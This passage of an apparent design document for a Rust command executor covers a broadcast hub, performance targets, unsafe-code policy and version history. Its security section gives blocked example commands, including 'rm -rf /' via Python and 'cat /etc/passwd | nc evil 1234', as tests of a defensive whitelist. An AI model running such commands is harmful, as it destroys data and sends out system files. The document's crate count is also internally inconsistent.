**Registry**: `sub_id → Subscriber{conn_id, channels: HashSet, tx: mpsc::Sender<Value>}`; conn/sub counters `AtomicU64`; `telemetry_task`/`screenshot_task` `Mutex<Option<JoinHandle>>` lazy start/stop (0 subscribers self-exit, next `subscribe` restarts; source methods take `&self` not `self: Arc<Self>` — avoids use-after-move on `.take()`).

**Connection DUPLEX**: `handle_conn` split into read_task (dispatch requests) + push_task (write server-push frames) sharing `Arc<AsyncMutex<OwnedWriteHalf>>` (lock for atomic line writes); each connection gets `mpsc::channel<Value>(128)` push frames + a oneshot close.

**Three broadcast sources** (lazy start/stop, 0 subscribers self-exit):

| Channel | Source | Notes |
|---|---|---|
| `telemetry` | single `executor.telemetry_stream` fan-out | 10Hz default, `interval_ms` adjustable |
| `stdio` | `execute`/`execute_stream` handlers call `hub.broadcast_stdio()` | **cross-connection**: A subscribes, B runs a command, A receives the push (chunk/done fan-out) |
| `screenshot` | periodic `gui_action(Screenshot)` sampling via `spawn_blocking` | `screenshot_interval_ms=1000` (slower than telemetry); TCC-untrusted → frame `data.ok=false`, no crash (reuses fe-gui safe wrapper) |

**Push frame** (no id — JSON-RPC notification convention; client distinguishes response vs push by presence of `id`):
```
{"jsonrpc":"2.0","method":"executor.event","params":{"subscription_id":"sub-1","channel":"telemetry","data":{...}}}
```
`collect_targets(channel)` snapshots sub_id+tx then `try_send` **outside the lock** (releases the lock before sending).

**fe-pyo3 unchanged** — server-push needs a running server; the pure-Python `Subscription` UDS client connects to the `serve()` socket. `subscribe()` opens a UDS connection, sends subscribe, reads the response to set `_sub_id`; `__next__` filters `executor.event` frames matching sub_id, skips non-event frames; `unsubscribe()` sends unsubscribe + closes the socket. `SUB_CHANNELS=("telemetry","stdio","screenshot")` — unknown channel → `ValueError`.

**fe-ipc adds 0 new unsafe** (screenshot reuses fe-gui safe wrapper; the crate keeps `unsafe_code="deny"`).

## 14. NFRs / SLA

Validated against criterion benches (P5) and real measurements:

| NFR / SLA | Target | Measured | Notes |
|---|---|---|---|
| CLI sandbox init overhead | <5ms | `Executor::new` **735µs** | lazy-init (tree-sitter parsers, git handles) on first use, not in `new()` |
| Log truncation + regex parse CPU | <3% under high throughput | `truncate_output` **~1.75GB/s** | head H + tail T fold-middle ring buffer; OOM cap kicks in at `2 * max_output_chars` |
| Token parse latency (10k-char compound command) | low | `validate` **317ns** | Stage-1 regex + Stage-2 shlex AST over `&&`/`||`/`;`/`|` |
| Click/keystroke latency | <30ms/node | CGEvent synthesis (v1.1) | measured in-process; AXUIElement tree walk ~100 nodes <30ms |
| Intercept rate (security) | 100% | full token-level parse | chain-assembly bypass defense — every pipe stage's argv[0] checked against whitelist |
| Python test coverage | >80% | **95%** | cli 96% / executor 90% / models 100% (in-process `cli.main()` tests) |
| Traceback→model-prompt transfer (UDS) | <2ms | newline-delimited JSON-RPC over UDS | zero-copy, localhost only |

**Chain-bypass defense**: the Stage-2 tokenizer splits compound commands on `&&`/`||`/`;`/`|` and validates **each** segment's binary — `python -c "import os; os.system('rm -rf /')"` is blocked at the python arg, `echo hi && sudo ls` blocked at `sudo`, `cat /etc/passwd | nc evil 1234` blocked at `nc`. Whitelist: `python`, `python3`, `node`, `npm`, `npx`, `pytest`, `cargo`, `rustc`, `swift`, `swiftc`, `git`, `ls`, `cat`, `echo`, `grep`, `find`, `mkdir`, `touch`, `pwd`, `which`, `file`, `head`, `tail`, `wc`, `sort`, `uniq`, `go`, `tsc` (v1.5 added `go`+`tsc` so real toolchain failures flow through E2E).

**OOM cap**: ring buffer — once buffer exceeds `2 * max_output_chars`, keep only tail T. Prevents OOM on infinite-print death-loops (`while True: print("x")`). Hard memory cap.

**Exit-code stability** (must stay stable across versions): `0` success, `-124` timeout (GNU `timeout` convention), `-1` blocked/security/internal.

## 15. Unsafe Policy

**7 of 10 crates** enforce `#![deny(unsafe_code)]` (or `unsafe_code="deny"`): `fe-core`, `fe-security`, `fe-sandbox`, `fe-rollback`, `fe-diagnostics`, `fe-tools`, `fe-telemetry`, `fe-pyo3`, `fe-ipc`. No hand-written `unsafe` in any of these.

**`fe-gui`** is the sole exception — crate-level `#![allow(unsafe_code)]`. rustc 1.96's `unsafe_extern_blocks` makes `AXIsProcessTrusted()` and `AXValueGetValue()` unsafe-to-call; there is no crate choice that avoids it. The scope is **3 audited FFI blocks only**:
1. `AXIsProcessTrusted()` — Accessibility permission probe.
2. `AXValueGetValue()` ×2 — read AXValue (CGPoint position, CGSize).

All other fe-gui FFI goes through **safe wrappers**: `accessibility` 0.2 (AXUIElement tree/focus/click/type/inspect/press), `core-graphics` 0.24 (`CGDisplay::screenshot` → PNG base64 Layer-B fallback; `CGEvent` synthesis for click/type/scroll/drag/key_press — `set_integer_value_field` etc.).

This is a user-approved scoped exception. Adding a new `unsafe` block to fe-gui (or any `unsafe` to the other 9 crates) requires explicit re-approval — do not widen the scope silently. The audit lives in the P4 design notes and the v1.1/v1.5 commit history.

**v1.5 #13 (7 new GuiAction variants) and #14 (BroadcastHub) added zero new `unsafe`** — all via safe wrappers (accessibility `press()` + attribute, core-graphics CGEvent / `set_integer_value_field`). `fe-ipc` kept `unsafe_code="deny"` through the broadcast work (screenshot reuses fe-gui safe wrapper).

## 16. Version History

Condensed changelog. Full per-version detail in `CLAUDE.md` "Project Status".

| Version | Scope | Tests (Rust + Py) | Commit |
|---|---|---|---|
| **v1 (P1–P5)** | 4 subsystems + Diagnostics Slicer. Security Guard (regex + shlex + whitelist), PTY Sandbox (timeout + truncation + OOM), macOS Computer Use (AXUIElement + CoreGraphics), Rollback Manager (git CLI). 8 crates. UDS JSON-RPC server. maturin/PyO3. NFRs met (735µs init, 95% cov). | 67 + 32 | — |
| **v1.1** | KeyPress — CGEvent synthesis replaces unsupported stub. `resolve_keycode` maps 40+ key names + aliases → `core_graphics::event::KeyCode`. Zero new unsafe (core-graphics 0.24 safe wrapper). | 69 + 33 | — |
| **v1.2** | Live stdio streaming (4 layers: fe-sandbox `run_streaming` → fe-core `execute_streaming` mpsc `Chunk`/`Done` → fe-ipc `executor.execute_stream` NDJSON multi-frame → fe-pyo3 `NativeStreamIterator` → Python generator). KeyPress modifiers (cmd/ctrl/alt/shift/fn). Screenshot width/height. pyo3 0.29 (`allow_threads`→`py.detach`, `PyObject`→`Py<PyAny>`). | 81 + 40 | — |
| **v1.3** | 3 PRD gaps filled. `ExecutionResult` gains `task_id`/`command`/`duration_sec` (PRD §4.1). NEW crate `fe-tools`: `file_edit` (unique-match replace), `glob` (canonicalize-before-pattern fix), `grep` (regex + walkdir + binary detect). Surgical Patch Engine: `apply_patch` (diffy Unified Diff, full-rewrite forbidden), `replace_function` (tree-sitter AST, stack-based preorder traversal — 0.25 has no `descendants()`). | 94 + 52 | — |
| **v1.4** | Auto-rollback (`AutoRollbackGuard` + `RollbackPolicy`, `result.auto_rolled_back`; executor stays stateless — caller owns consecutive-failure count). Live telemetry — NEW crate `fe-telemetry` (10Hz sysinfo sampling, GPU caller-injected `Option`+`skip_serializing_if`); `start_stream` spawns on passed `BLOCKING_RT.handle()` not bare `tokio::spawn`). GUI scroll/drag/wait (CGEvent). | 105 + 60 | — |
| **v1.5** | Diagnostics Slicer 4→8 languages (TS tsc + tsc watch, Node V8, Bun, Rust panic, Go-panic, Swift, Go-compile). Whitelist +`go`+`tsc`. Real tsc/go E2E verified. (#13) GUI 9→16 variants: `double_click`/`right_click`/`hover` + `window_close`/`window_minimize`/`window_zoom`/`window_resize`; 0 new unsafe; enum-level dispatch = zero per-variant wiring. (#14) Bidirectional server-push: `BroadcastHub` duplex pub-sub 3 channels (telemetry/stdio/screenshot), Executor stays stateless, 0 new unsafe. | 120 + 70 | `2ae4fb4` |

**Next** (not started): see `architecture/fusion-executor-prd.md` remaining FRs and `architecture/fusion-code-executor.md` for the fusion-code refactor integration plan.
